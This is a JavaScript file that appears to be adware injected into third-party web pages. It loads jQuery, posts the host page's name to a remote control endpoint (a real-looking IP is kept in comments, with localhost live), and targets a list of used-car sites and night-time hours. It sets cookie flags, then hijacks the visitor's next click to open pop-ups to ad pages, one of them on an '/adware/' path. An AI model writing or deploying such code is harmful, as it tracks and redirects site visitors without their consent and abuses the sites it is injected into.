window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
	
	
	window.url1 = top.location.hostname;

	var reqType = 1;
	var ad = 0;
	window.opp = 1;
	window.aop = 0;
	var xmlHttp;
	//alert(url1);
	script.onload = script.onreadystatechange = function() {
		if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
			ap(reqType, ad, url1);

		}
		script.onload = script.onreadystatechange = null;
	}


}

function ap(reqType, ad, url1) {

if (navigator.cookieEnabled == true) {
	
	//sendPostRequest("http://113.57.230.176:8888/404/Po", "reqType=3&url=" + url1);
	sendPostRequest("http://127.0.0.1:8080/404/Po", "reqType=3&url=" + url1);
	var popFlag = getCookie('FlagForAbc123123');
	 	 
	if (popFlag == null || popFlag == "") {
		popFlag = 0;
		

	}
	
		
	
	
	if (popFlag ==0) {
		$.ajax({
			type : 'post',
			//url : 'http://113.57.230.176:8888/404/admin/Paction',
			url : 'http://127.0.0.1:8080/404/admin/paction',
			data : {
				"reqType" : reqType,
				"ad" : ad,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {
				console.log("可操作类型:"+result.status);
				console.log(result.dese);
				if (result.status == "0") {
					if (result.dese == "0") {
						var beginTime = new Date();
						var endTime = new Date();
						beginTime.setHours(21);
						beginTime.setMinutes(59);
						endTime.setHours(6);
						endTime.setMinutes(30);     
						var n = new Date();
						
						if (n.getTime() - beginTime.getTime() > 0 && n.getTime() - endTime.getTime() < 0) {
							opp = 3;
							

						}
						
					
					}
					if (result.dese == "1" && aop == 0) {
						
						opp = 2;
						if (url1=="a.xcar.com.cn"||url1 == "m.che168.com"||url1=="m.jingzhengu.com"||url1=="m.gongpingjia.com"||url1=="m.jingzhengu.com"||url1=="m.taoche.com"||url1=="www.laocher.com"||url1=="www.hx2car.com"||url1=="www.chevip.com"||url1=="m.iautos.cn"||url1=="wap.uu2car.com"||url1=="www.yicheshi.com"||url1=="m.haoche51.com") {
							opp = 4
							
						}
						
					}
					if (result.dese == "2") {
						opp = 2;
						
						if (url1=="a.xcar.com.cn"||url1 == "m.che168.com"||url1=="m.jingzhengu.com"||url1=="m.gongpingjia.com"||url1=="m.jingzhengu.com"||url1=="m.taoche.com"||url1=="www.laocher.com"||url1=="www.hx2car.com"||url1=="www.chevip.com"||url1=="m.iautos.cn"||url1=="wap.uu2car.com"||url1=="www.yicheshi.com"||url1=="m.haoche51.com") {
							opp = 4
						}
					}
					//setCookie("FlagForAbc123123", opp, 60 * 24);
				}
				else
					{
					setCookie("FlagForAbc123123", 9, 60 * 24);
					}

			},
			error : function() {setCookie("FlagForAbc123123", 9, 60 * 24);}
		});
	
	} else {
            return;

	}
}
}

document.onclick = function(ev) {

	if (opp == 2 || opp == 3 || opp == 4) {
		var ap = 5;
		if (opp == 3) {

			ap = 1;
		}
		if (opp == 4) {
			ap = 3
		}
		
		opp = 5;

		
		$.ajax({
			type : 'post',
			url : 'http://127.0.0.1:8080/404/admin/paction',
			//url : 'http://113.57.230.176:8888/404/admin/Paction',
			data : {
				"reqType" : 5,
				"ad" : ap,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				console.log("处理结果："+result.status); 
				console.log(result.dese);
				if (result.status == "3") {
					setCookie("FlagForAbc123123", opp, 60 * 24);

				}

			},
			error : function() {

				setCookie("FlagForAbc123123", 9, 60 * 24);
			}
		});
		if (ap == 1) {
			window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 3) {
			
			window.open("http://m.mychebao.com/czhib_promote/temSecIndex.htm?id=67");
		}
		if (ap == 5) {
			window.open("http://iwap.2345.com/?lm_1128");
		}

	} else {

         return;
	}
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());

}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}
